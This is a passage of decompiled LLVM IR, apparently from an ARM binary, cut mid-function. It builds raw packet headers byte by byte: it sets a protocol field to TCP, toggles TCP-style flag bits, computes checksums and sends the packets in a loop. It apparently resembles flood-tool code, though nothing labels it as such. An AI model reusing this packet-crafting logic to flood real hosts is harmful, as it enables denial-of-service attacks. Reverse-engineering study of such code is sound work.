  store i32 %v5_bc5c, i32* %r2.global-to-local, align 4
  %v1_bc60 = trunc i32 %v0_bc5c to i8
  %v2_bc60 = load i32, i32* @r4, align 4
  %v3_bc60 = add i32 %v2_bc60, 2
  %v4_bc60 = inttoptr i32 %v3_bc60 to i8*
  store i8 %v1_bc60, i8* %v4_bc60, align 1
  %v0_bc64 = load i32, i32* %lr.global-to-local, align 4
  %v2_bc64 = icmp eq i32 %v0_bc64, 0
  store i1 %v2_bc64, i1* %cpsr_z.global-to-local, align 1
  %v0_bc68 = load i32, i32* %r2.global-to-local, align 4
  %v3_bc68 = sdiv i32 %v0_bc68, 256
  store i32 %v3_bc68, i32* %r3.global-to-local, align 4
  store i32 %v4_bc6c, i32* %r2.global-to-local, align 4
  %v1_bc70 = trunc i32 %v3_bc68 to i8
  %v2_bc70 = load i32, i32* @r4, align 4
  %v3_bc70 = add i32 %v2_bc70, 3
  %v4_bc70 = inttoptr i32 %v3_bc70 to i8*
  store i8 %v1_bc70, i8* %v4_bc70, align 1
  %v0_bc74 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bc74, label %bb77, label %bb76

bb76:                                             ; preds = %dec_label_pc_bb78
  store i32 64, i32* %r3.global-to-local, align 4
  br label %bb77

bb77:                                             ; preds = %dec_label_pc_bb78, %bb76
  %v0_bc78 = load i32, i32* %r2.global-to-local, align 4
  %v1_bc78 = trunc i32 %v0_bc78 to i8
  %v2_bc78 = load i32, i32* @r4, align 4
  %v3_bc78 = add i32 %v2_bc78, 8
  %v4_bc78 = inttoptr i32 %v3_bc78 to i8*
  store i8 %v1_bc78, i8* %v4_bc78, align 1
  %v0_bc7c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bc7c, label %.thread6, label %bb78

bb78:                                             ; preds = %bb77
  %v1_bc7c = load i32, i32* %r3.global-to-local, align 4
  %v2_bc7c = trunc i32 %v1_bc7c to i8
  %v3_bc7c = load i32, i32* @r4, align 4
  %v4_bc7c = add i32 %v3_bc7c, 6
  %v5_bc7c = inttoptr i32 %v4_bc7c to i8*
  store i8 %v2_bc7c, i8* %v5_bc7c, align 1
  %v0_bc80.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bc80.pr, label %.thread6, label %bb79

bb79:                                             ; preds = %bb78
  store i32 0, i32* %r2.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %bb77, %bb78, %bb79
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_bc88 = load i32, i32* @r4, align 4
  %v3_bc88 = add i32 %v2_bc88, 9
  %v4_bc88 = inttoptr i32 %v3_bc88 to i8*
  store i8 6, i8* %v4_bc88, align 1
  %v0_bc8c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bc8c, label %bb81, label %bb80

bb80:                                             ; preds = %.thread6
  %v1_bc8c = load i32, i32* %r2.global-to-local, align 4
  %v2_bc8c = trunc i32 %v1_bc8c to i8
  %v3_bc8c = load i32, i32* @r4, align 4
  %v4_bc8c = add i32 %v3_bc8c, 7
  %v5_bc8c = inttoptr i32 %v4_bc8c to i8*
  store i8 %v2_bc8c, i8* %v5_bc8c, align 1
  br label %bb81

bb81:                                             ; preds = %.thread6, %bb80
  %v2_bc94 = load i32, i32* @global_var_1e46c.86, align 4
  store i32 %v2_bc94, i32* %r3.global-to-local, align 4
  %v0_bc98 = load i32, i32* %r0.global-to-local, align 4
  %v3_bc98 = sdiv i32 %v0_bc98, 256
  store i32 %v3_bc98, i32* %ip.global-to-local, align 4
  %v1_bc9c = load i32, i32* @r4, align 4
  %v2_bc9c = add i32 %v1_bc9c, 12
  %v3_bc9c = inttoptr i32 %v2_bc9c to i32*
  store i32 %v2_bc94, i32* %v3_bc9c, align 4
  %v0_bca0 = load i32, i32* %ip.global-to-local, align 4
  %v1_bca0 = trunc i32 %v0_bca0 to i8
  %v2_bca0 = load i32, i32* @r4, align 4
  %v3_bca0 = add i32 %v2_bca0, 5
  %v4_bca0 = inttoptr i32 %v3_bca0 to i8*
  store i8 %v1_bca0, i8* %v4_bca0, align 1
  %v3_bca4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_bca4, i32* %r2.global-to-local, align 4
  store i32 %v2_b748, i32* %ip.global-to-local, align 4
  %v4_bcac = mul i32 %v3_bca4, 16
  %v5_bcac = add i32 %v4_bcac, %v2_b748
  %v6_bcac = inttoptr i32 %v5_bcac to i32*
  %v7_bcac = load i32, i32* %v6_bcac, align 4
  store i32 %v7_bcac, i32* %r3.global-to-local, align 4
  %v0_bcb0 = load i32, i32* %r0.global-to-local, align 4
  %v1_bcb0 = trunc i32 %v0_bcb0 to i8
  %v2_bcb0 = load i32, i32* @r4, align 4
  %v3_bcb0 = add i32 %v2_bcb0, 4
  %v4_bcb0 = inttoptr i32 %v3_bcb0 to i8*
  store i8 %v1_bcb0, i8* %v4_bcb0, align 1
  %v0_bcb4 = load i32, i32* %r3.global-to-local, align 4
  %v1_bcb4 = load i32, i32* @r4, align 4
  %v2_bcb4 = add i32 %v1_bcb4, 16
  %v3_bcb4 = inttoptr i32 %v2_bcb4 to i32*
  store i32 %v0_bcb4, i32* %v3_bcb4, align 4
  %v0_bcb8 = load i32, i32* %r2.global-to-local, align 4
  %v3_bcb8 = mul i32 %v0_bcb8, 16
  %v1_bcbc = load i32, i32* %ip.global-to-local, align 4
  %v2_bcbc = add i32 %v1_bcbc, %v3_bcb8
  store i32 %v2_bcbc, i32* %r2.global-to-local, align 4
  %v1_bcc0 = add i32 %v2_bcbc, 13
  %v2_bcc0 = inttoptr i32 %v1_bcc0 to i8*
  %v3_bcc0 = load i8, i8* %v2_bcc0, align 1
  %v4_bcc0 = zext i8 %v3_bcc0 to i32
  store i32 %v4_bcc0, i32* %r1.global-to-local, align 4
  %v1_bcc4 = add i32 %v2_bcbc, 12
  %v2_bcc4 = inttoptr i32 %v1_bcc4 to i8*
  %v3_bcc4 = load i8, i8* %v2_bcc4, align 1
  %v4_bcc4 = zext i8 %v3_bcc4 to i32
  %v4_bcc8 = mul nuw nsw i32 %v4_bcc0, 256
  %v5_bcc8 = or i32 %v4_bcc4, %v4_bcc8
  store i32 %v5_bcc8, i32* %r3.global-to-local, align 4
  %v2_bccc = load i32, i32* @r4, align 4
  %v3_bccc = add i32 %v2_bccc, 20
  %v4_bccc = inttoptr i32 %v3_bccc to i8*
  store i8 %v3_bcc4, i8* %v4_bccc, align 1
  %v0_bcd0 = load i32, i32* @r4, align 4
  %v1_bcd0 = add i32 %v0_bcd0, 20
  store i32 %v1_bcd0, i32* @r6, align 4
  %v0_bcd4 = load i32, i32* %r3.global-to-local, align 4
  %v3_bcd4 = sdiv i32 %v0_bcd4, 256
  store i32 %v3_bcd4, i32* %r3.global-to-local, align 4
  %v1_bcd8 = trunc i32 %v3_bcd4 to i8
  %v3_bcd8 = add i32 %v0_bcd0, 21
  %v4_bcd8 = inttoptr i32 %v3_bcd8 to i8*
  store i8 %v1_bcd8, i8* %v4_bcd8, align 1
  %v0_bcdc = load i32, i32* @r6, align 4
  %v1_bcdc = add i32 %v0_bcdc, 13
  %v2_bcdc = inttoptr i32 %v1_bcdc to i8*
  %v3_bcdc = load i8, i8* %v2_bcdc, align 1
  %v4_bcdc = zext i8 %v3_bcdc to i32
  store i32 %v4_bcdc, i32* %r3.global-to-local, align 4
  %v0_bce0 = load i32, i32* %r2.global-to-local, align 4
  %v1_bce0 = add i32 %v0_bce0, 8
  %v2_bce0 = inttoptr i32 %v1_bce0 to i32*
  %v3_bce0 = load i32, i32* %v2_bce0, align 4
  store i32 %v3_bce0, i32* %r1.global-to-local, align 4
  %v1_bce4 = or i32 %v4_bcdc, 1
  store i32 %v1_bce4, i32* %r3.global-to-local, align 4
  %v1_bce8 = add i32 %v0_bce0, 15
  %v2_bce8 = inttoptr i32 %v1_bce8 to i8*
  %v3_bce8 = load i8, i8* %v2_bce8, align 1
  %v4_bce8 = zext i8 %v3_bce8 to i32
  store i32 %v4_bce8, i32* %ip.global-to-local, align 4
  %v1_bcec = add i32 %v0_bce0, 14
  %v2_bcec = inttoptr i32 %v1_bcec to i8*
  %v3_bcec = load i8, i8* %v2_bcec, align 1
  %v4_bcec = zext i8 %v3_bcec to i32
  store i32 %v4_bcec, i32* %r0.global-to-local, align 4
  %v2_bcf0 = add i32 %v0_bcdc, 4
  %v3_bcf0 = inttoptr i32 %v2_bcf0 to i32*
  store i32 %v3_bce0, i32* %v3_bcf0, align 4
  %v0_bcf4 = load i32, i32* %r2.global-to-local, align 4
  %v1_bcf4 = add i32 %v0_bcf4, 4
  %v2_bcf4 = inttoptr i32 %v1_bcf4 to i32*
  %v3_bcf4 = load i32, i32* %v2_bcf4, align 4
  store i32 %v3_bcf4, i32* %lr.global-to-local, align 4
  %v0_bcf8 = load i32, i32* %r3.global-to-local, align 4
  %v1_bcf8 = trunc i32 %v0_bcf8 to i8
  %v2_bcf8 = load i32, i32* @r6, align 4
  %v3_bcf8 = add i32 %v2_bcf8, 13
  %v4_bcf8 = inttoptr i32 %v3_bcf8 to i8*
  store i8 %v1_bcf8, i8* %v4_bcf8, align 1
  %v0_bcfc = load i32, i32* @r6, align 4
  %v1_bcfc = add i32 %v0_bcfc, 12
  %v2_bcfc = inttoptr i32 %v1_bcfc to i8*
  %v3_bcfc = load i8, i8* %v2_bcfc, align 1
  %v4_bcfc = zext i8 %v3_bcfc to i32
  store i32 %v4_bcfc, i32* %r2.global-to-local, align 4
  %v1_bd00 = add i32 %v0_bcfc, 13
  %v2_bd00 = inttoptr i32 %v1_bd00 to i8*
  %v3_bd00 = load i8, i8* %v2_bd00, align 1
  %v4_bd00 = zext i8 %v3_bd00 to i32
  %v0_bd04 = load i32, i32* %r0.global-to-local, align 4
  %v1_bd04 = load i32, i32* %ip.global-to-local, align 4
  %v4_bd04 = mul i32 %v1_bd04, 256
  %v5_bd04 = or i32 %v4_bd04, %v0_bd04
  store i32 %v5_bd04, i32* %r0.global-to-local, align 4
  %tmp101 = urem i8 %v3_bcfc, 16
  %v1_bd08 = zext i8 %tmp101 to i32
  %v3_bd0c = sdiv i32 %v5_bd04, 256
  store i32 %v3_bd0c, i32* %r1.global-to-local, align 4
  %v1_bd10 = or i32 %v1_bd08, 128
  store i32 %v1_bd10, i32* %r2.global-to-local, align 4
  %v1_bd14 = or i32 %v4_bd00, 16
  store i32 %v1_bd14, i32* %r3.global-to-local, align 4
  %v1_bd18 = trunc i32 %v3_bd0c to i8
  %v3_bd18 = add i32 %v0_bcfc, 3
  %v4_bd18 = inttoptr i32 %v3_bd18 to i8*
  store i8 %v1_bd18, i8* %v4_bd18, align 1
  %v0_bd1c = load i32, i32* %lr.global-to-local, align 4
  %v1_bd1c = load i32, i32* @r6, align 4
  %v2_bd1c = add i32 %v1_bd1c, 8
  %v3_bd1c = inttoptr i32 %v2_bd1c to i32*
  store i32 %v0_bd1c, i32* %v3_bd1c, align 4
  %v0_bd20 = load i32, i32* %r2.global-to-local, align 4
  %v1_bd20 = trunc i32 %v0_bd20 to i8
  %v2_bd20 = load i32, i32* @r6, align 4
  %v3_bd20 = add i32 %v2_bd20, 12
  %v4_bd20 = inttoptr i32 %v3_bd20 to i8*
  store i8 %v1_bd20, i8* %v4_bd20, align 1
  %v0_bd24 = load i32, i32* %r3.global-to-local, align 4
  %v1_bd24 = trunc i32 %v0_bd24 to i8
  %v2_bd24 = load i32, i32* @r6, align 4
  %v3_bd24 = add i32 %v2_bd24, 13
  %v4_bd24 = inttoptr i32 %v3_bd24 to i8*
  store i8 %v1_bd24, i8* %v4_bd24, align 1
  %v0_bd28 = load i32, i32* %r0.global-to-local, align 4
  %v1_bd28 = trunc i32 %v0_bd28 to i8
  %v2_bd28 = load i32, i32* @r6, align 4
  %v3_bd28 = add i32 %v2_bd28, 2
  %v4_bd28 = inttoptr i32 %v3_bd28 to i8*
  store i8 %v1_bd28, i8* %v4_bd28, align 1
  %v0_bd2c = call i32 @function_fe24()
  %v1_bd2c = trunc i32 %v0_bd2c to i8
  store i32 %v0_bd2c, i32* %r0.global-to-local, align 4
  store i32 %v1_b810, i32* %lr.global-to-local, align 4
  %v0_bd34 = load i32, i32* @r6, align 4
  %v1_bd34 = add i32 %v0_bd34, 13
  %v2_bd34 = inttoptr i32 %v1_bd34 to i8*
  %v3_bd34 = load i8, i8* %v2_bd34, align 1
  %v4_bd34 = zext i8 %v3_bd34 to i32
  store i32 %v1_bd38, i32* %r2.global-to-local, align 4
  %v1_bd3c = and i32 %v4_bd34, 223
  %v5_bd40 = or i32 %v1_bd3c, %v4_bd40
  store i32 %v5_bd40, i32* %r3.global-to-local, align 4
  %v1_bd44 = trunc i32 %v5_bd40 to i8
  store i8 %v1_bd44, i8* %v2_bd34, align 1
  store i32 %v1_b830, i32* %r1.global-to-local, align 4
  %v0_bd4c = load i32, i32* @r6, align 4
  %v1_bd4c = add i32 %v0_bd4c, 13
  %v2_bd4c = inttoptr i32 %v1_bd4c to i8*
  %v3_bd4c = load i8, i8* %v2_bd4c, align 1
  %v4_bd4c = zext i8 %v3_bd4c to i32
  store i32 %v1_bd50, i32* %r3.global-to-local, align 4
  %v1_bd54 = and i32 %v4_bd4c, 239
  %v5_bd58 = or i32 %v1_bd54, %v4_bd58
  store i32 %v5_bd58, i32* %r2.global-to-local, align 4
  %v1_bd5c = trunc i32 %v5_bd58 to i8
  store i8 %v1_bd5c, i8* %v2_bd4c, align 1
  store i32 %v1_b850, i32* %ip.global-to-local, align 4
  %v0_bd64 = load i32, i32* @r6, align 4
  %v1_bd64 = add i32 %v0_bd64, 13
  %v2_bd64 = inttoptr i32 %v1_bd64 to i8*
  %v3_bd64 = load i8, i8* %v2_bd64, align 1
  %v4_bd64 = zext i8 %v3_bd64 to i32
  store i32 %v1_bd68, i32* %r2.global-to-local, align 4
  %v1_bd6c = and i32 %v4_bd64, 247
  %v5_bd70 = or i32 %v1_bd6c, %v4_bd70
  store i32 %v5_bd70, i32* %r3.global-to-local, align 4
  %v1_bd74 = trunc i32 %v5_bd70 to i8
  store i8 %v1_bd74, i8* %v2_bd64, align 1
  %v0_bd7c = load i32, i32* @r6, align 4
  %v1_bd7c = add i32 %v0_bd7c, 13
  %v2_bd7c = inttoptr i32 %v1_bd7c to i8*
  %v3_bd7c = load i8, i8* %v2_bd7c, align 1
  %v4_bd7c = zext i8 %v3_bd7c to i32
  store i32 %v1_bd80, i32* %r3.global-to-local, align 4
  %v1_bd84 = and i32 %v4_bd7c, 251
  %v5_bd88 = or i32 %v1_bd84, %v4_bd88
  store i32 %v5_bd88, i32* %r2.global-to-local, align 4
  %v1_bd8c = trunc i32 %v5_bd88 to i8
  store i8 %v1_bd8c, i8* %v2_bd7c, align 1
  store i32 %v1_b890, i32* %r1.global-to-local, align 4
  %v0_bd94 = load i32, i32* @r6, align 4
  %v1_bd94 = add i32 %v0_bd94, 13
  %v2_bd94 = inttoptr i32 %v1_bd94 to i8*
  %v3_bd94 = load i8, i8* %v2_bd94, align 1
  %v4_bd94 = zext i8 %v3_bd94 to i32
  store i32 %v1_bd98, i32* %r2.global-to-local, align 4
  %v1_bd9c = and i32 %v4_bd94, 253
  %v4_bda0 = or i32 %v1_bd9c, %v3_bda0
  store i32 %v4_bda0, i32* %r3.global-to-local, align 4
  %v1_bda4 = trunc i32 %v4_bda0 to i8
  store i8 %v1_bda4, i8* %v2_bd94, align 1
  %v0_bda8 = load i32, i32* @r6, align 4
  %v1_bda8 = add i32 %v0_bda8, 13
  %v2_bda8 = inttoptr i32 %v1_bda8 to i8*
  %v3_bda8 = load i8, i8* %v2_bda8, align 1
  %v4_bda8 = zext i8 %v3_bda8 to i32
  %v0_bdac = load i32, i32* @r8, align 4
  %v1_bdac = urem i32 %v0_bdac, 2
  %v1_bdb0 = and i32 %v4_bda8, 254
  store i32 %v1_bdb0, i32* %r2.global-to-local, align 4
  %v4_bdb427 = udiv i32 %v0_bd2c, 256
  %v2_bdb8 = or i32 %v1_bdb0, %v1_bdac
  store i32 %v2_bdb8, i32* %r3.global-to-local, align 4
  %v1_bdbc = trunc i32 %v4_bdb427 to i8
  %v3_bdbc = add i32 %v0_bda8, 15
  %v4_bdbc = inttoptr i32 %v3_bdbc to i8*
  store i8 %v1_bdbc, i8* %v4_bdbc, align 1
  %v3_bdc0 = load i32, i32* @r6, align 4
  %v4_bdc0 = add i32 %v3_bdc0, 14
  %v5_bdc0 = inttoptr i32 %v4_bdc0 to i8*
  store i8 %v1_bd2c, i8* %v5_bdc0, align 1
  %v0_bdc4 = load i32, i32* %r3.global-to-local, align 4
  %v1_bdc4 = trunc i32 %v0_bdc4 to i8
  %v2_bdc4 = load i32, i32* @r6, align 4
  %v3_bdc4 = add i32 %v2_bdc4, 13
  %v4_bdc4 = inttoptr i32 %v3_bdc4 to i8*
  store i8 %v1_bdc4, i8* %v4_bdc4, align 1
  %v0_bdc8 = load i32, i32* @r4, align 4
  %v1_bdc8 = add i32 %v0_bdc8, 40
  store i32 %v1_bdc8, i32* %r0.global-to-local, align 4
  %v0_bdcc = load i32, i32* @sb, align 4
  store i32 %v0_bdcc, i32* @r1, align 4
  %v1_bdd0 = inttoptr i32 %v1_bdc8 to i8*
  %v2_bdd0 = call i32 @function_10000(i8* %v1_bdd0)
  store i32 %v2_bdd0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bdd4

dec_label_pc_bdd4:                                ; preds = %dec_label_pc_b974, %bb81
  %v3_bdd4 = load i32, i32* %stack_var_-40, align 4
  %v1_bdd8 = add i32 %v3_bdd4, 1
  store i32 %v1_bdd8, i32* %r3.global-to-local, align 4
  %v1_bddc = load i32, i32* @fp, align 4
  %v9_bddc = icmp eq i32 %v1_bdd8, %v1_bddc
  store i1 %v9_bddc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_bdd8, i32* %stack_var_-40, align 4
  %v5_bde4 = icmp slt i32 %v1_bdd8, %v1_bddc
  br i1 %v5_bde4, label %dec_label_pc_b964, label %dec_label_pc_bde8

dec_label_pc_bde8:                                ; preds = %dec_label_pc_bdd4, %.thread18
  %v0_bdf012 = phi i32 [ %v0_b938, %.thread18 ], [ %v1_bddc, %dec_label_pc_bdd4 ]
  %v0_bde8 = load i32, i32* @sb, align 4
  %v1_bde8 = add i32 %v0_bde8, 40
  store i32 %v1_bde8, i32* @sl, align 4
  %v1_bdec = add i32 %v0_bde8, 20
  store i32 %v1_bdec, i32* @r7, align 4
  %v2_be3c = icmp eq i32 %v1_b8e8, 0
  %v6_be1c = inttoptr i32 %v2_b758 to i32*
  %v9_be24 = icmp eq i32 %v3_b940, add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1)
  br label %dec_label_pc_bdf0

dec_label_pc_bdf0:                                ; preds = %dec_label_pc_be4c, %dec_label_pc_bde8
  %v0_bdf0 = phi i32 [ %v1_bf2c, %dec_label_pc_be4c ], [ %v0_bdf012, %dec_label_pc_bde8 ]
  %v2_bdf0 = icmp eq i32 %v0_bdf0, 0
  store i1 %v2_bdf0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  %tmp82 = icmp slt i32 %v0_bdf0, 1
  br label %dec_label_pc_bdf8

dec_label_pc_bdf8:                                ; preds = %dec_label_pc_bdf8, %dec_label_pc_bdf0
  br i1 %tmp82, label %dec_label_pc_bdf8, label %dec_label_pc_bdfc

dec_label_pc_bdfc:                                ; preds = %dec_label_pc_bdf8
  %v0_bdfc = load i32, i32* @r7, align 4
  %tmp83 = mul i32 %v0_bdfc, 256
  %v1_be04 = and i32 %tmp83, 65280
  %tmp84 = udiv i32 %v0_bdfc, 256
  %v4_be08 = urem i32 %tmp84, 256
  %v5_be08 = or i32 %v4_be08, %v1_be04
  store i32 %v5_be08, i32* @r8, align 4
  store i32 %v2_b758, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10000.26 to i32), i32* %r3.global-to-local, align 4
  store i32 %v3_b940, i32* %ip.global-to-local, align 4
  %v7_be1c = load i32, i32* %v6_be1c, align 4
  store i32 %v7_be1c, i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i1 %v9_be24, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* @r6, align 4
  %v1_be30 = add i32 %v7_be1c, 20
  store i32 %v1_be30, i32* @r5, align 4
  br i1 %v9_be24, label %dec_label_pc_bf58, label %dec_label_pc_be38

dec_label_pc_be38:                                ; preds = %dec_label_pc_bf38, %dec_label_pc_bdfc
  %v0_be40 = phi i32 [ %v7_bf44, %dec_label_pc_bf38 ], [ %v7_be1c, %dec_label_pc_bdfc ]
  store i32 %v1_b8e8, i32* %lr.global-to-local, align 4
  store i1 %v2_be3c, i1* %cpsr_z.global-to-local, align 1
  %v1_be40 = add i32 %v0_be40, 40
  store i32 %v1_be40, i32* %r0.global-to-local, align 4
  %v0_be44 = load i32, i32* @sb, align 4
  store i32 %v0_be44, i32* @r1, align 4
  br i1 %v2_be3c, label %dec_label_pc_be4c, label %dec_label_pc_bf7c

dec_label_pc_be4c:                                ; preds = %dec_label_pc_be38, %dec_label_pc_bf58, %dec_label_pc_bf7c
  %v2_be4c = phi i32 [ %v0_be40, %dec_label_pc_be38 ], [ %v0_bf70, %dec_label_pc_bf58 ], [ %v2_be4c.pre, %dec_label_pc_bf7c ]
  %v0_be4c = load i32, i32* @r6, align 4
  %v1_be4c = trunc i32 %v0_be4c to i8
  %v3_be4c = add i32 %v2_be4c, 10
  %v4_be4c = inttoptr i32 %v3_be4c to i8*
  store i8 %v1_be4c, i8* %v4_be4c, align 1
  %v0_be50 = load i32, i32* @r6, align 4
  %v1_be50 = trunc i32 %v0_be50 to i8
  %v2_be50 = load i32, i32* @r4, align 4
  %v3_be50 = add i32 %v2_be50, 11
  %v4_be50 = inttoptr i32 %v3_be50 to i8*
  store i8 %v1_be50, i8* %v4_be50, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_be58 = load i32, i32* @r4, align 4
  store i32 %v0_be58, i32* @r0, align 4
  %v2_be5c = call i32 @function_e424(i32 %v0_be58, i32 20)
  %v3_be5c = trunc i32 %v2_be5c to i8
  store i32 %v2_be5c, i32* %r0.global-to-local, align 4
  %v3_be60 = load i32, i32* %stack_var_-40, align 4
  store i32 %v2_b748, i32* %r2.global-to-local, align 4
  %v3_be68 = mul i32 %v3_be60, 16
  %v2_be6c = add i32 %v3_be68, %v2_b748
  store i32 %v2_be6c, i32* %r1.global-to-local, align 4
  %v1_be70 = add i32 %v2_be6c, 4
  %v2_be70 = inttoptr i32 %v1_be70 to i32*
  %v3_be70 = load i32, i32* %v2_be70, align 4
  %v3_be74 = mul i32 %v3_be70, 65536
  store i32 %v3_be74, i32* %ip.global-to-local, align 4
  %tmp85 = mul i32 %v3_be70, 256
  %v1_be7c = and i32 %tmp85, 65280
  %tmp86 = udiv i32 %v3_be70, 256
  %v4_be80 = urem i32 %tmp86, 256
  %v5_be80 = or i32 %v4_be80, %v1_be7c
  store i32 %v5_be80, i32* %r2.global-to-local, align 4
  %v1_be84 = add i32 %v3_be70, 1
  store i32 %v1_be84, i32* %r3.global-to-local, align 4
  store i32 %v1_be84, i32* %v2_be70, align 4
  %v0_be8c = load i32, i32* %r2.global-to-local, align 4
  %v1_be8c = load i32, i32* @r5, align 4
  %v2_be8c = add i32 %v1_be8c, 4
  %v3_be8c = inttoptr i32 %v2_be8c to i32*
  store i32 %v0_be8c, i32* %v3_be8c, align 4
  %v0_be90 = load i32, i32* %r1.global-to-local, align 4
  %v1_be90 = add i32 %v0_be90, 8
  %v2_be90 = inttoptr i32 %v1_be90 to i32*
  %v3_be90 = load i32, i32* %v2_be90, align 4
  %tmp87 = mul i32 %v3_be90, 256
  %v1_be9c = and i32 %tmp87, 65280
  %tmp88 = udiv i32 %v3_be90, 256
  %v4_bea0 = urem i32 %tmp88, 256
  %v5_bea0 = or i32 %v4_bea0, %v1_be9c
  store i32 %v5_bea0, i32* %r2.global-to-local, align 4
  %v4_bea428 = udiv i32 %v2_be5c, 256
  %v1_bea8 = trunc i32 %v4_bea428 to i8
  %v2_bea8 = load i32, i32* @r4, align 4
  %v3_bea8 = add i32 %v2_bea8, 11
  %v4_bea8 = inttoptr i32 %v3_bea8 to i8*
  store i8 %v1_bea8, i8* %v4_bea8, align 1
  %v3_beac = load i32, i32* @r4, align 4
  %v4_beac = add i32 %v3_beac, 10
  %v5_beac = inttoptr i32 %v4_beac to i8*
  store i8 %v3_be5c, i8* %v5_beac, align 1
  %v0_beb0 = load i32, i32* %r2.global-to-local, align 4
  %v1_beb0 = load i32, i32* @r5, align 4
  %v2_beb0 = add i32 %v1_beb0, 8
  %v3_beb0 = inttoptr i32 %v2_beb0 to i32*
  store i32 %v0_beb0, i32* %v3_beb0, align 4
  %v0_beb4 = load i32, i32* @r5, align 4
  store i32 %v0_beb4, i32* @r1, align 4
  %v0_beb8 = load i32, i32* @r8, align 4
  store i32 %v0_beb8, i32* %r2.global-to-local, align 4
  %v0_bebc = load i32, i32* @r7, align 4
  store i32 %v0_bebc, i32* %r3.global-to-local, align 4
  %v0_bec0 = load i32, i32* @r4, align 4
  store i32 %v0_bec0, i32* %r0.global-to-local, align 4
  %v0_bec4 = load i32, i32* @r6, align 4
  %v1_bec4 = trunc i32 %v0_bec4 to i8
  %v3_bec4 = add i32 %v0_beb4, 16
  %v4_bec4 = inttoptr i32 %v3_bec4 to i8*
  store i8 %v1_bec4, i8* %v4_bec4, align 1
  %v0_bec8 = load i32, i32* @r6, align 4
  %v1_bec8 = trunc i32 %v0_bec8 to i8
  %v2_bec8 = load i32, i32* @r5, align 4
  %v3_bec8 = add i32 %v2_bec8, 17
  %v4_bec8 = inttoptr i32 %v3_bec8 to i8*
  store i8 %v1_bec8, i8* %v4_bec8, align 1
  %v4_becc = call i32 @function_e480(i32 %v0_bec0, i32 %v0_beb4, i32 %v0_beb8, i32 %v0_bebc)
  %v5_becc = trunc i32 %v4_becc to i8
  store i32 %v4_becc, i32* %r0.global-to-local, align 4
  %v4_bed029 = udiv i32 %v4_becc, 256
  %v1_bed4 = trunc i32 %v4_bed029 to i8
  %v2_bed4 = load i32, i32* @r5, align 4
  %v3_bed4 = add i32 %v2_bed4, 17
  %v4_bed4 = inttoptr i32 %v3_bed4 to i8*
  store i8 %v1_bed4, i8* %v4_bed4, align 1
  %v3_bed8 = load i32, i32* @r5, align 4
  %v4_bed8 = add i32 %v3_bed8, 16
  %v5_bed8 = inttoptr i32 %v4_bed8 to i8*
  store i8 %v5_becc, i8* %v5_bed8, align 1
  %v3_bedc = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_bedc, i32* %r3.global-to-local, align 4
  %v0_bee0 = load i32, i32* @r4, align 4
  %v1_bee0 = add i32 %v0_bee0, 20
  %v2_bee0 = inttoptr i32 %v1_bee0 to i32*
  %v3_bee0 = load i32, i32* %v2_bee0, align 4
  %v5_bee8 = mul i32 %v3_bedc, 24
  %v3_bef0 = udiv i32 %v3_bee0, 65536
  store i32 %v3_bef0, i32* %r2.global-to-local, align 4
  %v2_bef4 = add i32 %v5_bee8, %arg2
  store i32 %v2_bef4, i32* %ip.global-to-local, align 4
  %v3_bef84 = udiv i32 %v3_bee0, 16777216
  %v1_befc = trunc i32 %v3_bef84 to i8
  %v3_befc = add i32 %v2_bef4, 3
  %v4_befc = inttoptr i32 %v3_befc to i8*
  store i8 %v1_befc, i8* %v4_befc, align 1
  %v0_bf00 = load i32, i32* %r2.global-to-local, align 4
  %v1_bf00 = trunc i32 %v0_bf00 to i8
  %v2_bf00 = load i32, i32* %ip.global-to-local, align 4
  %v3_bf00 = add i32 %v2_bf00, 2
  %v4_bf00 = inttoptr i32 %v3_bf00 to i8*
  store i8 %v1_bf00, i8* %v4_bf00, align 1
  %v0_bf04 = load i32, i32* @r4, align 4
  store i32 %v0_bf04, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_b8f8, i32* %r0.global-to-local, align 4
  %v0_bf10 = load i32, i32* @sl, align 4
  store i32 %v0_bf10, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_bf18 = load i32, i32* %ip.global-to-local, align 4
  %v6_bf20 = inttoptr i32 %v0_bf04 to i32*
  %v7_bf20 = call i32 @function_1372c(i32 %v3_b8f8, i32* %v6_bf20, i32 %v0_bf10, i32 16384, i32 %v0_bf18, i32 16)
  %v3_bf24 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_bf24, i32* %r3.global-to-local, align 4
  %v1_bf28 = add i32 %v3_bf24, 1
  store i32 %v1_bf28, i32* %r0.global-to-local, align 4
  %v1_bf2c = load i32, i32* @fp, align 4
  %v9_bf2c = icmp eq i32 %v1_bf28, %v1_bf2c
  store i1 %v9_bf2c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_bf28, i32* %stack_var_-40, align 4
  %v6_bf34 = icmp slt i32 %v1_bf28, %v1_bf2c
  br i1 %v6_bf34, label %dec_label_pc_bf38, label %dec_label_pc_bdf0

dec_label_pc_bf38:                                ; preds = %dec_label_pc_be4c
  store i32 %v2_b758, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10000.26 to i32), i32* %r3.global-to-local, align 4
  store i32 %v3_b940, i32* %ip.global-to-local, align 4
  %v4_bf44 = mul i32 %v1_bf28, 4
  %v5_bf44 = add i32 %v4_bf44, %v2_b758
  %v6_bf44 = inttoptr i32 %v5_bf44 to i32*
